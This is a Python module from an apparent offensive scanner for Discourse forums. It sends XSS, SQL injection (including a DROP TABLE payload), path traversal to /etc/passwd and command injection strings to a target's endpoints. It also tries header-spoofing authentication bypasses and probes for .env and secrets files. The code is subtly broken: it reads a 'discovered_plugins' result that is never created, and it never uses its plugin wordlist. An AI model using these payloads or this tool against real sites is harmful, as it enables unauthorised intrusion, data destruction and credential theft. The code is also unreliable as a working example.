#!/usr/bin/env python3
"""
Discourse Security Scanner - Plugin Bruteforce Module

 plugin detection and vulnerability bruteforce testing
"""

import re
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, quote
from bs4 import BeautifulSoup
from colorama import Fore, Style
from .utils import extract_csrf_token, make_request

class PluginBruteforceModule:
    """Plugin vulnerability bruteforce attack module"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'module_name': 'Plugin Bruteforce Attacks',
            'target': scanner.target_url,
            'endpoint_attacks': [],
            'vulnerability_tests': [],
            'file_disclosures': [],
            'configuration_leaks': [],
            'injection_tests': [],
            'authentication_bypasses': []
        }
        
        # Comprehensive plugin list for bruteforce detection
        self.plugin_wordlist = [
            # Popular plugins
            'discourse-chat-integration', 'discourse-solved', 'discourse-voting',
            'discourse-calendar', 'discourse-data-explorer', 'discourse-sitemap',
            'discourse-oauth2-basic', 'discourse-saml', 'discourse-ldap-auth',
            'discourse-akismet', 'discourse-math', 'discourse-spoiler-alert',
            'discourse-checklist', 'discourse-assign', 'discourse-babble',
            'discourse-reactions', 'discourse-follow', 'discourse-locations',
            'discourse-events', 'discourse-docs', 'discourse-encrypt',
            'discourse-signatures', 'discourse-user-notes', 'discourse-tooltips',
            'discourse-policy', 'discourse-prometheus', 'discourse-slack-official',
            'discourse-telegram', 'discourse-discord-bot', 'discourse-github',
            'discourse-translator', 'discourse-canned-replies', 'discourse-retort',
            'discourse-topic-voting', 'discourse-yearly-review', 'discourse-adplugin',
            'discourse-affiliate', 'discourse-automation', 'discourse-backup-uploads-to-s3',
            'discourse-brand-header', 'discourse-category-experts', 'discourse-category-icons',
            'discourse-category-lockdown', 'discourse-chat', 'discourse-code-review',
            'discourse-custom-wizard', 'discourse-data-explorer', 'discourse-donations',
            'discourse-footnote', 'discourse-formatting-toolbar', 'discourse-gamification',
            'discourse-group-tracker', 'discourse-hashtag-autocomplete', 'discourse-invite-tokens',
            'discourse-kanban-board', 'discourse-knowledge-explorer', 'discourse-league',
            'discourse-local-dates', 'discourse-logster', 'discourse-narrative-bot',
            'discourse-no-bump', 'discourse-openid-connect', 'discourse-patreon',
            'discourse-perspective-api', 'discourse-post-voting', 'discourse-presence',
            'discourse-push-notifications', 'discourse-quick-messages', 'discourse-saved-searches',
            'discourse-steam-login', 'discourse-subscriptions', 'discourse-topic-list-previews',
            'discourse-user-card-badges', 'discourse-watch-category-mcneel', 'discourse-zendesk-plugin',
            
            # Security-related plugins
            'discourse-2fa', 'discourse-security-headers', 'discourse-rate-limit-edit',
            'discourse-login-required', 'discourse-restrict-by-ip', 'discourse-captcha',
            'discourse-honeypot', 'discourse-spam-handler', 'discourse-user-verification',
            
            # Theme components
            'discourse-theme-creator', 'discourse-custom-header-links', 'discourse-hamburger-theme-selector',
            'discourse-category-banners', 'discourse-clickable-topic', 'discourse-easy-footer',
            'discourse-flexible-page-header', 'discourse-header-search', 'discourse-material-theme',
            'discourse-sidebar-blocks', 'discourse-topic-thumbnails', 'discourse-versatile-banner'
        ]
        
        # Common plugin endpoints and files
        self.plugin_endpoints = {
            'admin': ['/admin', '/admin/plugins', '/admin/settings'],
            'api': ['/api', '/api/plugins', '/api/admin'],
            'assets': ['/assets', '/javascripts', '/stylesheets'],
            'uploads': ['/uploads', '/files', '/attachments'],
            'webhooks': ['/webhook', '/webhooks', '/callback'],
            'auth': ['/auth', '/login', '/oauth', '/saml', '/ldap']
        }
        
        # Vulnerability test payloads
        self.vuln_payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'sqli': [
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '/etc/passwd%00',
                '....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ],
            'rce': [
                '; ls -la',
                '| whoami',
                '`id`',
                '$(whoami)',
                '; cat /etc/passwd',
                '&& dir'
            ]
        }
        
    def run(self):
        """Run complete plugin bruteforce attack scan"""
        # Removed print statement for cleaner output
        
        # Endpoint bruteforce saldırıları
        self._bruteforce_endpoints()
        
        # Zafiyet bruteforce testleri
        self._bruteforce_vulnerabilities()
        
        # Injection saldırı testleri
        self._test_injection_attacks()
        
        # Authentication bypass testleri
        self._test_authentication_bypasses()
        
        # Dosya ifşası testleri
        self._test_file_disclosures()
        
        # Konfigürasyon sızıntı testleri
        self._test_configuration_leaks()
        
        return self.results
    
    def _test_injection_attacks(self):
        """Test various injection attacks on plugin endpoints"""
        # Removed print statement for cleaner output
        
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "1' AND '1'='1"
        ]
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"<script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        # Command injection payloads
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        # Test endpoints with injection payloads
        test_endpoints = [
            '/admin/plugins',
            '/admin/api',
            '/search',
            '/users',
            '/categories',
            '/t/topic',
            '/posts'
        ]
        
        for endpoint in test_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test SQL injection
            for payload in sql_payloads:
                test_url = f"{url}?q={quote(payload)}"
                response = make_request(self.scanner.session, 'GET', test_url)
                
                if response and self._detect_sql_injection(response):
                    self.results['injection_tests'].append({
                        'type': 'SQL Injection',
                        'endpoint': endpoint,
                        'payload': payload,
                        'severity': 'Critical',
                        'status': 'Vulnerable'
                    })
            
            # Test XSS
            for payload in xss_payloads:
                test_url = f"{url}?search={quote(payload)}"
                response = make_request(self.scanner.session, 'GET', test_url)
                
                if response and payload in response.text:
                    self.results['injection_tests'].append({
                        'type': 'XSS',
                        'endpoint': endpoint,
                        'payload': payload,
                        'severity': 'High',
                        'status': 'Vulnerable'
                    })
            
            # Test command injection
            for payload in cmd_payloads:
                test_url = f"{url}?cmd={quote(payload)}"
                response = make_request(self.scanner.session, 'GET', test_url)
                
                if response and self._detect_command_injection(response):
                    self.results['injection_tests'].append({
                        'type': 'Command Injection',
                        'endpoint': endpoint,
                        'payload': payload,
                        'severity': 'Critical',
                        'status': 'Vulnerable'
                    })
    
    def _test_authentication_bypasses(self):
        """Test authentication bypass techniques"""
        # Removed print statement for cleaner output
        
        bypass_techniques = [
            # Header manipulation
            {'headers': {'X-Forwarded-For': '127.0.0.1'}, 'description': 'IP Whitelist Bypass'},
            {'headers': {'X-Real-IP': '127.0.0.1'}, 'description': 'Real IP Bypass'},
            {'headers': {'X-Originating-IP': '127.0.0.1'}, 'description': 'Originating IP Bypass'},
            {'headers': {'X-Remote-IP': '127.0.0.1'}, 'description': 'Remote IP Bypass'},
            {'headers': {'X-Client-IP': '127.0.0.1'}, 'description': 'Client IP Bypass'},
            
            # User-Agent manipulation
            {'headers': {'User-Agent': 'DiscourseBot'}, 'description': 'Bot User-Agent Bypass'},
            {'headers': {'User-Agent': 'Googlebot'}, 'description': 'Search Engine Bypass'},
            
            # Authentication headers
            {'headers': {'Authorization': 'Bearer admin'}, 'description': 'Weak Token Bypass'},
            {'headers': {'X-API-Key': 'admin'}, 'description': 'API Key Bypass'},
            {'headers': {'X-Auth-Token': 'bypass'}, 'description': 'Auth Token Bypass'}
        ]
        
        protected_endpoints = [
            '/admin',
            '/admin/users',
            '/admin/plugins',
            '/admin/api',
            '/admin/logs',
            '/admin/settings'
        ]
        
        for endpoint in protected_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test normal access first
            normal_response = make_request(self.scanner.session, 'GET', url)
            if not normal_response or normal_response.status_code == 200:
                continue  # Already accessible
            
            # Test bypass techniques
            for technique in bypass_techniques:
                headers = technique['headers']
                response = make_request(self.scanner.session, 'GET', url, headers=headers)
                
                if response and response.status_code == 200:
                    self.results['authentication_bypasses'].append({
                        'endpoint': endpoint,
                        'technique': technique['description'],
                        'headers': headers,
                        'severity': 'Critical',
                        'status': 'Bypassed'
                    })
    
    def _bruteforce_endpoints(self):
        """Bruteforce attack on plugin endpoints"""
        # Removed print statement for cleaner output
        
        # Common attack endpoints
        attack_endpoints = [
            '/admin/plugins/install',
            '/admin/plugins/upload',
            '/admin/api/keys',
            '/admin/users/list',
            '/admin/logs/staff_action_logs',
            '/admin/settings/all_settings',
            '/plugins/explorer/queries',
            '/plugins/chat/channels',
            '/plugins/assign/assign',
            '/plugins/voting/vote',
            '/plugins/solved/accept',
            '/api/admin/plugins',
            '/api/admin/users',
            '/api/admin/settings'
        ]
        
        # HTTP methods to test
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        
        for endpoint in attack_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for method in methods:
                response = make_request(self.scanner.session, method, url)
                
                if response:
                    if response.status_code == 200:
                        self.results['endpoint_attacks'].append({
                            'endpoint': endpoint,
                            'method': method,
                            'status': 'accessible',
                            'severity': 'High',
                            'response_size': len(response.content)
                        })
                    elif response.status_code in [401, 403]:
                        # Try with different payloads
                        self._test_endpoint_bypasses(url, method, endpoint)
    
    def _test_endpoint_bypasses(self, url, method, endpoint):
        """Test endpoint bypass techniques"""
        bypass_payloads = [
            {'path': '/../admin', 'description': 'Path Traversal'},
            {'path': '/./admin', 'description': 'Current Directory'},
            {'path': '/%2e%2e/admin', 'description': 'URL Encoded Traversal'},
            {'path': '//admin', 'description': 'Double Slash'},
            {'path': '/admin/', 'description': 'Trailing Slash'},
            {'path': '/Admin', 'description': 'Case Variation'},
            {'path': '/ADMIN', 'description': 'Uppercase'},
            {'path': '/admin%20', 'description': 'Space Padding'},
            {'path': '/admin%00', 'description': 'Null Byte'},
            {'path': '/admin?', 'description': 'Query Parameter'}
        ]
        
        for payload in bypass_payloads:
            test_url = url.replace(endpoint, endpoint + payload['path'])
            response = make_request(self.scanner.session, method, test_url)
            
            if response and response.status_code == 200:
                self.results['endpoint_attacks'].append({
                    'endpoint': endpoint,
                    'method': method,
                    'bypass_technique': payload['description'],
                    'payload': payload['path'],
                    'status': 'bypassed',
                    'severity': 'Critical'
                })
    
    def _bruteforce_vulnerabilities(self):
        """Bruteforce vulnerability testing on discovered endpoints"""
        # Removed print statement for cleaner output
        
        endpoints = self.results['endpoint_attacks']
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            
            # Test each vulnerability type
            for vuln_type, payloads in self.vuln_payloads.items():
                for payload in payloads:
                    self._test_vulnerability('unknown', endpoint, vuln_type, payload)
    
    def _test_vulnerability(self, plugin, endpoint, vuln_type, payload):
        """Test specific vulnerability with payload"""
        url = urljoin(self.scanner.target_url, endpoint)
        
        # Test GET parameter injection
        get_url = f"{url}?test={quote(payload)}"
        response = make_request(self.scanner.session, 'GET', get_url)
        
        if response and self._check_vulnerability_response(response, vuln_type, payload):
            self.results['vulnerability_tests'].append({
                'plugin': plugin,
                'endpoint': endpoint,
                'vulnerability_type': vuln_type,
                'method': 'GET',
                'payload': payload,
                'severity': self._get_severity(vuln_type),
                'status': 'vulnerable'
            })
        
        # Test POST parameter injection
        data = {'test': payload, 'param': payload}
        response = make_request(self.scanner.session, 'POST', url, data=data)
        
        if response and self._check_vulnerability_response(response, vuln_type, payload):
            self.results['vulnerability_tests'].append({
                'plugin': plugin,
                'endpoint': endpoint,
                'vulnerability_type': vuln_type,
                'method': 'POST',
                'payload': payload,
                'severity': self._get_severity(vuln_type),
                'status': 'vulnerable'
            })
    
    def _test_file_disclosures(self):
        """Test for file disclosure vulnerabilities"""
        # Removed print statement for cleaner output
        
        sensitive_files = [
            'config/database.yml',
            'config/secrets.yml',
            'config/application.yml',
            '.env',
            'plugin.rb',
            'settings.yml',
            'README.md',
            'CHANGELOG.md',
            'package.json',
            'Gemfile',
            'Gemfile.lock'
        ]
        
        discovered_plugins = [p['plugin'] for p in self.results['discovered_plugins'] if p.get('status') == 'found']
        
        for plugin in discovered_plugins:
            for file in sensitive_files:
                file_paths = [
                    f'/plugins/{plugin}/{file}',
                    f'/plugins/{plugin}/config/{file}',
                    f'/admin/plugins/{plugin}/{file}'
                ]
                
                for file_path in file_paths:
                    url = urljoin(self.scanner.target_url, file_path)
                    response = make_request(self.scanner.session, 'GET', url)
                    
                    if response and response.status_code == 200:
                        if self._check_sensitive_file_content(response.text, file):
                            self.results['file_disclosures'].append({
                                'plugin': plugin,
                                'file': file,
                                'path': file_path,
                                'severity': 'High',
                                'description': f'Sensitive file {file} accessible'
                            })
    
    def _test_configuration_leaks(self):
        """Test for configuration information leaks"""
        # Removed print statement for cleaner output
        
        config_endpoints = [
            '/admin/plugins.json',
            '/admin/site_settings.json',
            '/admin/dashboard.json',
            '/site.json',
            '/srv/status.json'
        ]
        
        for endpoint in config_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if self._check_sensitive_config(data):
                        self.results['configuration_leaks'].append({
                            'endpoint': endpoint,
                            'type': 'Configuration Leak',
                            'severity': 'Medium',
                            'description': f'Sensitive configuration exposed at {endpoint}'
                        })
                except json.JSONDecodeError:
                    pass
    
    def _check_sensitive_content(self, content):
        """Check if content contains sensitive information"""
        sensitive_keywords = [
            'password', 'secret', 'token', 'key', 'api_key',
            'database', 'connection', 'credential', 'auth',
            'private', 'confidential', 'internal'
        ]
        
        content_lower = content.lower()
        return any(keyword in content_lower for keyword in sensitive_keywords)
    
    def _check_vulnerability_response(self, response, vuln_type, payload):
        """Check if response indicates vulnerability"""
        if vuln_type == 'xss':
            return payload in response.text or 'alert(' in response.text
        elif vuln_type == 'sqli':
            sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sqlite']
            return any(error in response.text.lower() for error in sql_errors)
        elif vuln_type == 'lfi':
            file_indicators = ['root:', 'daemon:', 'bin:', 'sys:', '[boot loader]']
            return any(indicator in response.text.lower() for indicator in file_indicators)
        elif vuln_type == 'rce':
            command_indicators = ['uid=', 'gid=', 'groups=', 'volume in drive']
            return any(indicator in response.text.lower() for indicator in command_indicators)
        
        return False
    
    def _check_sensitive_file_content(self, content, filename):
        """Check if file content is sensitive"""
        if filename.endswith('.yml') or filename.endswith('.yaml'):
            return any(keyword in content.lower() for keyword in ['password:', 'secret:', 'key:', 'token:'])
        elif filename == '.env':
            return '=' in content and any(keyword in content.upper() for keyword in ['PASSWORD', 'SECRET', 'KEY', 'TOKEN'])
        elif filename == 'plugin.rb':
            return 'class' in content or 'module' in content
        
        return len(content) > 100  # Basic check for substantial content
    
    def _check_sensitive_config(self, data):
        """Check if configuration data contains sensitive information"""
        if isinstance(data, dict):
            for key, value in data.items():
                if any(keyword in key.lower() for keyword in ['password', 'secret', 'token', 'key']):
                    return True
                if isinstance(value, (dict, list)):
                    if self._check_sensitive_config(value):
                        return True
        elif isinstance(data, list):
            for item in data:
                if self._check_sensitive_config(item):
                    return True
        
        return False
    
    def _detect_sql_injection(self, response):
        """Detect SQL injection vulnerabilities"""
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sqlite',
            'syntax error', 'mysql error', 'warning: mysql', 'function.mysql',
            'mysql result', 'mysqlclient', 'com.mysql.jdbc.exceptions'
        ]
        return any(error in response.text.lower() for error in sql_errors)
    
    def _detect_command_injection(self, response):
        """Detect command injection vulnerabilities"""
        command_indicators = [
            'uid=', 'gid=', 'groups=', 'volume in drive',
            'directory of', 'total ', 'drwx', '-rw-'
        ]
        return any(indicator in response.text.lower() for indicator in command_indicators)
    
    def _get_severity(self, vuln_type):
        """Get severity level for vulnerability type"""
        severity_map = {
            'xss': 'Medium',
            'sqli': 'High',
            'lfi': 'High',
            'rce': 'Critical'
        }
        return severity_map.get(vuln_type, 'Medium')